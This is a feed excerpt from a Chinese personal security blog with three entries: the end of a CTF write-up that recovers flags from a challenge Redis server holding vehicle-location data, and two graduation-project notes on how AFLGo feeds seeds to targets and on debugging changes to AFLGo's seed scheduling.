Coder，即编程类题目。</p><h3 id="2-4-LOCATION-ANALYSIS"><a href="#2-4-LOCATION-ANALYSIS" class="headerlink" title="2-4 LOCATION ANALYSIS"></a><strong>2-4</strong> <strong>LOCATION ANALYSIS</strong></h3><p>首先此题给出的目标服务器是tcp:portal.hackazon.org:17002，结合题目的描述猜想是某数据库的借口。直接用telnet模拟tcp连接进行交互，发现如下的字符互动信息，可以被当作指纹去查看背后是什么数据库在运行。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1Eauo0DZSOdtkfWORB6_-A.png" alt="37"></p><p>简单搜索后发现是Redis数据库，连接上查看所有的Key，发现其中的存在”_flag”的键，查看其的值就可以得到第一关的flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/lYTwnjSB7DIci-cYI-S5lg.png" alt="38"></p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;DGErbbodqEeHQhjeDs8g&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了解决第二关，我们重新梳理下题目的情景。我们所连接的Redis数据库存储城市中自动驾驶车辆的实时位置的数据库，数据在实时更新，需要我们对数据进行分析。接着，在连接数据库后我们使用info命令对该题目的出题方式进行分析。我们可以看到实时的连接数，猜想后端只有一个共用的Redis，将其6379号端口映射到不同的端口供选手连接。所以我们应该是需要对数据库中的数据进行分析并找出flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/-JkxAyrzD7W_brYtyyRvHA.png" alt="39"></p><p>通过简单的分析可以发现，该数据库中一共有存储着1000个车辆的实时位置信息。数据库中的每个Key即车辆信息通过Json形式的数据结构保存，包括了其车牌号、经、纬度坐标。因为车辆的坐标是实时更新的，所以最直接的想法是将一段时间每个车的轨迹先画出来，看看有没有什么蛛丝马迹可循。</p><p>连接数据库并间隔一定时间保存每个车辆的的位置，最后绘制多点的轨迹图，我们可以发现一串类似于flag的车辆轨迹如下所示。</p><p>![40](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (15).png)</p><p>接着，为了看得更清楚，我通过点的移动距离可以筛选出构成flag的点，并且调小了时间间隔。同时由于该图是由车的轨迹构成，所以我自然而然想绘制动态图片来搞清楚此flag是如何绘制的，这可能有助于我猜测各个位置的字母和数字是什么。所以，我得到了如下的gif图片，我们可以隐约地看到flag，但是很多位置并不明确，只能靠猜。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/gif.gif" alt="41"></p><p>但是还是不明确，经过meishijia的提醒下，我把横纵坐标的比例调成了一致使得每个字母更加协调。此时可以猜测出大部分的字符，但是有些位置还是无法确定。</p><p>![42](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (14).png)</p><p>最后在meishijia的点拨下，我把轨迹图更换成了散点图，这样产生噪音的一些线条就被去除，最终得到了Flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/XVRgPPl5ovYE2NUpVH9zDQ.jpeg" alt="43">     </p><p>此题留给我的经验是：做题时不能急功近利，要多思考，小心尝试。在得到倒数第二张图时，我觉得答案已经呼之欲出，所以一直在猜测每个位置的字符，并尝试爆破。这其实花费了不少时间，最终也没有得到正确的Flag.但是如果能观察图片的构成，思考别的呈现方式，去除连线轨迹产生的噪音，将折线图改为散点图，其实答案就自然而然地呈现啦。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;简介：&lt;/p&gt;
&lt;p&gt;本文Deloitte Hacky Holiday比赛的WriteUp，主办方的题目非常有质量而且梯度拉开非常友好。我们最终在2334只参赛队伍中取得了75名次的成绩，再接再厉！&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://laobameishijia.github.io/category/CTF/"/>
    
    
    <category term="WriteUp" scheme="https://laobameishijia.github.io/tag/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>毕设-Fuzz-AFLGo源码阅读-6</title>
    <link href="https://laobameishijia.github.io/2022/04/21/bi-she-fuzz-aflgo-yuan-ma-yue-du-6/"/>
    <id>https://laobameishijia.github.io/2022/04/21/bi-she-fuzz-aflgo-yuan-ma-yue-du-6/</id>
    <published>2022-04-21T09:25:00.000Z</published>
    <updated>2022-08-04T10:38:04.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AFL种子文件是如何送入目标程序的？"><a href="#AFL种子文件是如何送入目标程序的？" class="headerlink" title="AFL种子文件是如何送入目标程序的？"></a>AFL种子文件是如何送入目标程序的？</h1><p>在做实验的过程中，因为要复现漏洞嘛，要把种子文件送入目标程序。这里产生了一个疑问</p><p><strong>如果我用重定向的方式把种子文件(二进制文件)送入目标程序中，那么目标程序会显示相应的报错。但是如果我将二进制文件的内容(使用xxd)复制下来，然后在送入程序中，目标程序就不会报错。</strong></p><p>在小刘的启发下，我开始对照源码，观察AFL是如何把种子文件送入目标程序。</p><p>得到的结论就是，AFL是采用重定向的方式将种子文件送入目标程序的。</p><hr><ol><li>首先是启动参数中含有@@的(目标程序接受<strong>文件名</strong>，作为输入参数)</li></ol><p><em><strong><code>@@</code>本身代表的就是运行xmllint过程中，需要送进去的文件名</strong></em></p><p><code>$AFLGO/afl-fuzz -m none -z exp -c 45m -i in -o out ./xmllint --valid --recover @@</code></p><p>AFL会找到<code>@@</code>的位置，然后把<code>@@</code>替换成<strong>out/.cur_input</strong>。并且指定<code>out_file</code>为。<code>out/.cur_input</code>。</p><p>具体细节可以参照函数 <code>detect_file_args</code></p><ol start="2"><li>然后是启动参数中不包含@@的(目标程序接受<strong>标准输入</strong>作为输入参数)</li></ol><p><code>$AFLGO/afl-fuzz -m none -z exp -c 45m -i in -o out binutils/cxxfilt</code></p><p>AFL会创建<code>cur_input</code>文件，然后把<code>out_fd</code>作为<code>.cur_input</code>的文件描述符</p><p>具体细节参照函数<code>setup_stdio_file</code></p><ol start="3"><li>紧接着会运行<code>perform_dry_run(..)</code>执行 input 文件夹下的预先准备的所有测试用例</li></ol><ol start="4"><li><code>perform_dry_run(..)</code>的循环里面会调用<code>calibrate_case(...)</code></li></ol><ol start="5"><li><code>calibrate_case(...)</code>在没有启动fork server的时候，会调用  <code>init_forkserver(argv)</code></li></ol><ol start="6"><li><code>init_forkserver(argv)</code>中的子进程会进行重定向</li></ol>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 如果指定了out_file，则标准输入重定向到dev_null_fd，否则重定向到out_fd</span><span class="token keyword">if</span> <span class="token punctuation">(</span>out_file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">dup2</span><span class="token punctuation">(</span>dev_null_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token function">dup2</span><span class="token punctuation">(</span>out_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span>out_fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  到此，也就是接受文件名作为参数的，会把标准输入重定向为NULL。接受标准输入作为参数的，回把out_fd指向的文件内容以标准输入的形式输入到程序中。</p><hr><p>特别说明，在每一次fuzz的过程中。AFL都会调用类似于<code>write_to_testcase</code>的函数，将新的变异过的文件内容，写入<code>out_file</code>中，并清楚原来的内容。</p><p>在fuzz的过程中，用到哪个种子文件就打开哪个，然后把种子文件的内容复制到<code>.cur_input</code>文件里面, 再对 <code>.cur_input</code>文件中内容进行 位翻转等一系列变异操作，同时观察是否可以保留下来。如果能保留下来，就保留。不能保留就进行下面的变异步骤。之后循环往复。 </p><h2 id="为什么二进制文件使用xxd查看的内容-和-重定向到标准输入得到的内容不一致"><a href="#为什么二进制文件使用xxd查看的内容-和-重定向到标准输入得到的内容不一致" class="headerlink" title="为什么二进制文件使用xxd查看的内容 和 重定向到标准输入得到的内容不一致"></a>为什么二进制文件使用xxd查看的内容 和 重定向到标准输入得到的内容不一致</h2><p><code>xxd</code>看到的是ASCII码，ASCII码一共就只有128个，也就是从<code>0x 00 - 0x 7F</code>。超过这个范围的编码，在xxd命令里面一律显示为<code>.</code>。 除此之外，还有一些控制码，比如退格(Backspace)、回车(Enter)等等，同样也会被显示为<code>.</code>。</p><p>所以你使用xxd看到的内容和重定向到标准输入得到的内容肯定是不一致的。 那你把看到的内容复制出来，然后再送给程序后，显示的结果 肯定 和重定向送入程序显示的结果 不一致。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220422102811.png" alt="xxd"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220422103118.png" alt="ASCII"></p><h2 id="那重定向是输入的什么呢？以什么方式输入的呢？"><a href="#那重定向是输入的什么呢？以什么方式输入的呢？" class="headerlink" title="那重定向是输入的什么呢？以什么方式输入的呢？"></a>那重定向是输入的什么呢？以什么方式输入的呢？</h2><p>一般来说接受标准输入的程序，会使用getchar()来获取标准输入的内容。</p><p>我就用做了一个测试, 发现显示不了的就是按二进制输入的估计。反正到程序里面之后都是以二进制的方式在判断。他只是没有对应的字符显示罢了。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220422105756.png" alt="测试"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">static</span> <span class="token keyword">char</span> mbuffer<span class="token punctuation">[</span><span class="token number">32767</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> c<span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>mbuffer<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32767</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token function">getchar</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>mbuffer<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token function">getchar</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>mbuffer<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>mbuffer<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AFL种子文件是如何送入目标程序的？&quot;&gt;&lt;a href=&quot;#AFL种子文件是如何送入目标程序的？&quot; class=&quot;headerlink&quot; title=&quot;AFL种子文件是如何送入目标程序的？&quot;&gt;&lt;/a&gt;AFL种子文件是如何送入目标程序的？&lt;/h1&gt;&lt;p&gt;在做实验的过</summary>
      
    
    
    
    <category term="毕设" scheme="https://laobameishijia.github.io/category/%E6%AF%95%E8%AE%BE/"/>
    
    
    <category term="Fuzz" scheme="https://laobameishijia.github.io/tag/Fuzz/"/>
    
    <category term="AFLGo" scheme="https://laobameishijia.github.io/tag/AFLGo/"/>
    
  </entry>
  
  <entry>
    <title>毕设-Fuzz-AFLGo源码修改.md</title>
    <link href="https://laobameishijia.github.io/2022/02/25/bi-she-fuzz-aflgo-yuan-ma-xiu-gai-1/"/>
    <id>https://laobameishijia.github.io/2022/02/25/bi-she-fuzz-aflgo-yuan-ma-xiu-gai-1/</id>
    <published>2022-02-25T09:25:00.000Z</published>
    <updated>2022-08-04T10:38:04.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="效率提升"><a href="#效率提升" class="headerlink" title="效率提升"></a>效率提升</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>最初就是把算法跑通了，然后也没有什么bug了。</p><blockquote><p><strong>效果可以说是惨不忍睹</strong>, 跑三个半小时，还不如AFLGo跑十几分钟。</p></blockquote><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220304205907.png" alt="1"></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>在fuzz_one中是有概率跳过代码的。我把这部分概率跳过的代码限制<strong>只在无差别探索阶段使用</strong>，效率提升了一些，但还远没有达到想要的效果。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220304210159.png" alt="2"></p><p>既然这样的话，我又想着，应该是把概率跳过的代码限制在 <strong>无差别探索阶段</strong> 和 <strong>短路径优先阶段</strong> 都使用才对。</p><blockquote><p>这样的效果也一般，跟上面的差不多。</p></blockquote><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>先从select_the_shortest开始优化,先优化寻找fuzz过的和没有fuzz过的。 </p><p>用新的指针 temp_queue_fuzzed在第一遍循环的时候，就找到的已经被fuzzed过的种子。</p><p>直接把所有的handle函数都更换了，顺便修改if语句的条件控制，尽量让条件尽可能的为真。–<strong>但是真并不意味着一定是你想要的</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220305112237.png" alt="3"></p><blockquote><p>longest和shortest_longest两个阶段运行的次数太少，速度也很慢。 尤其是那个trim阶段，stage execs后面那个数很大。会有700多或者是800多。</p></blockquote><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>鉴于，之前的算法非常慢。而且没有完全符合论文中的描述。所以我决定重新设计算法。</p><p>在算法的编写过程中，尤其是复用其他函数中的代码段时，总是会出现一些变量名忘记更改的问题。导致出现访问空指针的情况。(段错误)</p><p>还有，在加入队列(<code>add_to_queue</code>)的时候，对最大最小值进行判定没有问题。 可是我忽略了，在队列(<code>calibrate_case</code>)当中进行最大和最小值的更替。</p><p>我dnmd，速度上确实是快了一些，但是效率上咋变低了呢？</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220306142106.png" alt="4"></p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>把论文中描述的在短路径优先阶段中，给予种子最大的能量给加进去了。效果依然不是很好。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220306153337.png" alt="5"></p><h3 id="验证crash"><a href="#验证crash" class="headerlink" title="验证crash"></a>验证crash</h3><p>pwndebug</p><p>即使是用正常的afl-fuzz跑出来的, 依然也只是有问题的输入样例。并不能产生像之前说的那种崩溃。 这种crash是如何计算的呢？</p><h3 id="下一步思路"><a href="#下一步思路" class="headerlink" title="下一步思路"></a>下一步思路</h3><p>下一步:</p><ul><li><p>继续优化短路径优先阶段。提高这个阶段的效率。</p></li><li><p>增加没有最短路径/最大基本块数的情况， 就是种子的值都还是-1的情况。</p></li><li><p>第二轮的效果，远远没有第一轮的效果好。</p></li></ul><p><strong>还有一个想法，我觉得我甚至可以把AFLGo的原理都写到毕业论文中。包括编译插桩是如何进行的，在运行的时候又是如何体现出来的。甚至包括forkserver与主进程之间的切换等等。</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220313105014.png" alt="5.2"></p><blockquote><p>图片当中的54个crash甚至都是第一轮跑出来的。 想一想为什么第二轮的效果远远不如第一轮呢？</p></blockquote><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>把短路径优先阶段的概率跳过给删去，再试一试。 —-但是这个好像不解决，第二轮的问题呀！</p><p>在最长的路径里面挑选最短的，又是段错误，我不知道为什么？？</p><p>这样把，明天把时间管理的指针重新写一下。 尽量就是不要让他第一次就进入到第一个循环里面去。</p><h3 id="为什么queue-max-bb-和queue-min-distance-有的时候为空指针？"><a href="#为什么queue-max-bb-和queue-min-distance-有的时候为空指针？" class="headerlink" title="为什么queue_max_bb 和queue_min_distance 有的时候为空指针？"></a>为什么queue_max_bb 和queue_min_distance 有的时候为空指针？</h3><p>因为下面这些代码—**has_new_bits()**函数里面的</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if (*total_count &gt; 0) &#123;  cur_distance &#x3D; (double)(*total_distance) &#x2F; (double)(*total_count);  cur_bb &#x3D; (double)(*total_count);&#125;else&#123;  cur_distance &#x3D; -1.0;  cur_bb &#x3D; -1.0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>可以看到只有在 <strong>total_count &gt; 0</strong> 的情况下，<code>cur_distance</code>和<code>cur_bb</code>的值才会更新。否则他们就一直是-1。</p></blockquote><p>而如果他们一直保持-1的值的话, 在calibrate_case()这个函数里面没有办法，更新 <code>queue_max_bb</code> 和 <code>queue_min_distance</code> 的指针 所以这两个指针就一直是空，就容易产生段错误。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if (q-&gt;distance &lt;&#x3D; 0) &#123;  &#x2F;* This calculates cur_distance *&#x2F;  has_new_bits(virgin_bits);  q-&gt;distance &#x3D; cur_distance;  q-&gt;bb &#x3D; cur_bb;  if (cur_distance &gt; 0) &#123;    if (max_distance &lt;&#x3D; 0) &#123;      max_distance &#x3D; cur_distance;      min_distance &#x3D; cur_distance;      queue_min_distance &#x3D; q;    &#125;    if (cur_distance &gt; max_distance) max_distance &#x3D; cur_distance;    if (cur_distance &lt; min_distance) &#123; queue_min_distance &#x3D; q; min_distance &#x3D; cur_distance; &#125;  &#125;  if (cur_bb &gt; 0) &#123;      if (max_bb &lt;&#x3D; 0) &#123;          max_bb &#x3D; cur_bb;          min_bb &#x3D; cur_bb;          queue_max_bb &#x3D; q;      &#125;      if (cur_bb &gt; max_bb) &#123; queue_max_bb &#x3D; q; max_bb &#x3D; cur_bb; &#125;      if (cur_bb &lt; min_bb) min_bb &#x3D; cur_bb;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么问题就又来了，在什么情况下 <code>total_count</code> 的值会 <code>&gt;0</code> ? 这个问题恐怕要回到插桩代码中去了。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">for (auto &amp;F : M) &#123;&#x2F;&#x2F;文件中的所有函数  int distance &#x3D; -1;  for (auto &amp;BB : F) &#123;&#x2F;&#x2F;函数中的所有基本块    distance &#x3D; -1;    if (is_aflgo) &#123;      &#x2F;*      这里获取每个基本块名字的方法和预处理阶段一样，取第一个有效指令的位置信息作为基本块名字      *&#x2F;      std::string bb_name;      for (auto &amp;I : BB) &#123;        std::string filename;        unsigned line;        getDebugLoc(&amp;I, filename, line);&#x2F;&#x2F;获取指令所在的文件名和行数        if (filename.empty() || line &#x3D;&#x3D; 0)          continue;        std::size_t found &#x3D; filename.find_last_of(&quot;&#x2F;\\&quot;);        if (found !&#x3D; std::string::npos)          filename &#x3D; filename.substr(found + 1);        bb_name &#x3D; filename + &quot;:&quot; + std::to_string(line);        break;      &#125;      if (!bb_name.empty()) &#123;        &#x2F;*         比较名字是否相同判断是否是需要插桩的基本块        *&#x2F;        if (find(basic_blocks.begin(), basic_blocks.end(), bb_name) &#x3D;&#x3D; basic_blocks.end()) &#123;          &#x2F;* 如果开启AFLGO_SELECTIVE选项，则不进入后面插桩的逻辑部分，即AFL的逻辑也只对AFLGo选择的基本块插桩           *&#x2F;          if (is_selective)            continue;        &#125; else &#123;          &#x2F;* Find distance for BB *&#x2F;          &#x2F;* 找到对应基本块的距离          *&#x2F;          if (AFL_R(100) &lt; dinst_ratio) &#123;            std::map&lt;std::string,int&gt;::iterator it;            for (it &#x3D; bb_to_dis.begin(); it !&#x3D; bb_to_dis.end(); ++it)              if (it-&gt;first.compare(bb_name) &#x3D;&#x3D; 0)                distance &#x3D; it-&gt;second;          &#125;        &#125;      &#125;    &#125;    &#x2F;* 进入插桩的逻辑部分，前面的部分是AFL的basicblock edge插桩逻辑    *&#x2F;    BasicBlock::iterator IP &#x3D; BB.getFirstInsertionPt();    IRBuilder&lt;&gt; IRB(&amp;(*IP));    if (AFL_R(100) &gt;&#x3D; inst_ratio) continue;    &#x2F;* Make up cur_loc *&#x2F;    unsigned int cur_loc &#x3D; AFL_R(MAP_SIZE);    ConstantInt *CurLoc &#x3D; ConstantInt::get(Int32Ty, cur_loc);    &#x2F;* Load prev_loc *&#x2F;    LoadInst *PrevLoc &#x3D; IRB.CreateLoad(AFLPrevLoc);    PrevLoc-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));    Value *PrevLocCasted &#x3D; IRB.CreateZExt(PrevLoc, IRB.getInt32Ty());    &#x2F;* Load SHM pointer *&#x2F;    LoadInst *MapPtr &#x3D; IRB.CreateLoad(AFLMapPtr);    MapPtr-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));    Value *MapPtrIdx &#x3D;        IRB.CreateGEP(MapPtr, IRB.CreateXor(PrevLocCasted, CurLoc));    &#x2F;* Update bitmap *&#x2F;    LoadInst *Counter &#x3D; IRB.CreateLoad(MapPtrIdx);    Counter-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));    Value *Incr &#x3D; IRB.CreateAdd(Counter, ConstantInt::get(Int8Ty, 1));    IRB.CreateStore(Incr, MapPtrIdx)       -&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));    &#x2F;* Set prev_loc to cur_loc &gt;&gt; 1 *&#x2F;    StoreInst *Store &#x3D;        IRB.CreateStore(ConstantInt::get(Int32Ty, cur_loc &gt;&gt; 1), AFLPrevLoc);    Store-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));        &#x2F;*     下面是AFLGo的距离插桩部分，将该基本块的距离累加到MapDistLoc的位置上，再递增MapCntLoc位置的值，     即：MapDistLoc上的值表示seed经过所有的基本块的距离累加和，MapCntLoc上的值表示seed经过的基本块的数量。    *&#x2F;    if (distance &gt;&#x3D; 0) &#123;      ConstantInt *Distance &#x3D;          ConstantInt::get(LargestType, (unsigned) distance);      &#x2F;* Add distance to shm[MAPSIZE] *&#x2F;      Value *MapDistPtr &#x3D; IRB.CreateBitCast(          IRB.CreateGEP(MapPtr, MapDistLoc), LargestType-&gt;getPointerTo());      LoadInst *MapDist &#x3D; IRB.CreateLoad(MapDistPtr);      MapDist-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));      Value *IncrDist &#x3D; IRB.CreateAdd(MapDist, Distance);      IRB.CreateStore(IncrDist, MapDistPtr)          -&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));      &#x2F;* Increase count at shm[MAPSIZE + (4 or 8)] *&#x2F;      Value *MapCntPtr &#x3D; IRB.CreateBitCast(          IRB.CreateGEP(MapPtr, MapCntLoc), LargestType-&gt;getPointerTo());      LoadInst *MapCnt &#x3D; IRB.CreateLoad(MapCntPtr);      MapCnt-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));      Value *IncrCnt &#x3D; IRB.CreateAdd(MapCnt, One);      IRB.CreateStore(IncrCnt, MapCntPtr)          -&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));    &#125;    inst_blocks++;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>那如果total_count 的值为零的话，是不是说明这个种子压根就没有进入到程序中去?</p></blockquote><p>我又尝试了一下对libxml2的调试, 因为对这个库进行fuzz的时候，种子是仓库中包含的。与预期的符合，可以看出<code>distance</code>和<code>bb</code>都是有值的</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220316111631.png" alt="调试libxml2"></p><hr><p><strong>解决方案就是, 当你在使用这两个指针的时候，记得判断一下是否为空。</strong></p><p>如果都为空的话，直接返回上一个被选中的种子。</p><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>现在有一个问题就是, <code>queue_min_distance</code> 和 <code>queue_max_bb</code> 经常是空指针, 这样就说明种子好像根本没有进到程序当中。</p><p>此外，cron的确是可以定时运行程序的，但是效果不是很好。一开始我是担心，cron启动的进程会不会在资源上有些受限，但是我再次在命令行运行之后，一个小时跑出来的结果居然才21. <strong>也就是说目前AFLGo的运行效果并不稳定，时好时坏</strong>。 </p><blockquote><p>还是要当面监控运行效果，否则很难发现问题到底出在什么地方</p></blockquote><p>短路径优先阶段中，<strong>没有发现更近的种子</strong> 和 <strong>没有发现新路径</strong> 这是两个不同的概念啊！</p><blockquote><p>我觉得对这个概念理解的不同直接导致了编写的算法中 偏向了路径发现。 通过对比和师兄论文中描述的实验对比，可以发现，在 <code>total_path</code> 这一指标上，很明显我的算法要比师兄的算法高。但这已经偏离了我们想要的效果。</p></blockquote><ul><li><code>calibrate_case</code> 和 <code>add_to_queue</code> 这两个函数发生的时机</li></ul><blockquote><p>我是这么理解的，<code>calibrate_case</code>进行的时候，是针对所有已经添加到队列中的种子了。所以我觉得并不需要考虑<code>calibrate_case</code>阶段中<code>min_distance</code>是否改变了。<code>save_if_interesting</code>中调用<code>add_to_queue</code>的时候我们需要看一下<code>min_distance</code>是否发生改变。</p></blockquote><ul><li><code>select_shortest_from_longest</code>函数中的<code>min_distance_in_longest</code>变量是否要更改成<code>0xFFFFFFFF</code></li></ul><p>把前面说的问题都改了，发现改了还不如不改。。。。  不过shortest阶段确实有一些进步。主要是以前无差别探索阶段总是可以探索出好多，但是现在无差别探索阶段探索不出来很多了。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220320170715.png" alt="20220320170715"></p><p>把短路径优先阶段直接改成–只接受更优解的情况之后，效果好了一些。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220321171916.png" alt="20220321171916"></p><p>通过我的观察发现，短路径优阶段一直重复那两个种子。其他的种子得不到fuzz。——<strong>这个是因为current_entry除了第一阶段后面就没有再增加了</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220323110203.png" alt="20220323110203"></p><p>着重看一下select_shortest阶段到底除了啥问题</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;效率提升&quot;&gt;&lt;a href=&quot;#效率提升&quot; class=&quot;headerlink&quot; title=&quot;效率提升&quot;&gt;&lt;/a&gt;效率提升&lt;/h1&gt;&lt;h2 id=&quot;1&quot;&gt;&lt;a href=&quot;#1&quot; class=&quot;headerlink&quot; title=&quot;1&quot;&gt;&lt;/a&gt;1&lt;/h2&gt;&lt;p</summary>
      
    
    
    
    <category term="毕设" scheme="https://laobameishijia.github.io/category/%E6%AF%95%E8%AE%BE/"/>
    
    
    <category term="Fuzz" scheme="https://laobameishijia.github.io/tag/Fuzz/"/>
    
